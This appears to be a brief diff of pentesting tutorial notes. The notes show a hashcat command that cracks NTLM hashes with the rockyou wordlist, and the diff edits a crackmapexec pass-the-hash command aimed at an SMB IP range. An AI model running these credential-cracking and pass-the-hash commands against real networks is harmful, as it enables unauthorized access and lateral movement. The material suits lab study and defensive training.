@@ -225,6 +225,6 @@ syntax: hashcat.exe -m 1000 /home/hacker/test.txt /usr/share/wordlists/rockyou.t
 
 Now, to pass the hash, we are going to use crackmapexec. 
 
-syntax: crackmapexec smb IPRANGE -u "User Name" -H <HASH> --local-auth
+syntax: crackmapexec smb IPRANGE -u "User Name"/userlogin -H <HASH> --local-auth
 
 Pass the Hash
